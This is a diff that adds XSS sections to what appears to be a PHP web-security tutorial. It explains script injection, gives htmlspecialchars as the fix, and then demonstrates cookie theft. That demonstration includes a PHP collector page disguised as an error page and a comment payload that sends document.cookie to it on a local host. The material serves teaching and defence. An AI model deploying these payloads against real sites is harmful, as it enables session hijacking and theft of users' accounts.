@@ -109,3 +109,59 @@ ini_set('display_errors', 'Off');
 
 ?>
 ```  
+
+#### Problem: XSS (Cross-Site Scripting)
+
+* Definition: Cross-site scripting, also known as XSS, is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
+
+* Let's assume that we have a comments section in our application (index.php under xss folder). Even though we made sure to be sql-injection safe, we are not safe from malicious xss attacks.
+
+    * I can put the `<script>` tags into the comment section:
+
+    ``` JS
+    <script>alert("i just got in by injecting this js script tag!! hahhahaha");</script>
+    ```
+
+    * If the developer then tried to show this data, in most crud system that is the case, then the javascript will execute on reload.
+
+#### Solution:
+* Simply employ the htmlspecialchars method on the post body to prevent injecting js into the database
+
+``` PHP
+$body =  htmlspecialchars($_POST['body'], ENT_QUOTES);
+```
+#### Problem: Stealing Cookies
+* Assume that the htmlspecialchars method is not used and XSS problem still exists.
+* A more damaging attack would be to redirect any user to a php file that steals cookies
+
+* hacker file that was created to steal cookies
+
+``` PHP
+<?php
+$cookie = $_GET['cookie'];
+file_put_contents('mycookies.text', $cookie);
+?>
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+
+
+    <h1>Page not working</h1>
+
+
+</body>
+</html>
+```
+* If the hacker was to write the following the comment section and submit it to the database then each user accessing the comment section would be redirected to the file that steals their cookies
+
+``` HTML
+You are getting redirected and hacked!
+<script>
+window.location =
+ 'http://localhost/security/xss/hacker.php?cookie='+escape(document.cookie);
+</script>
+```
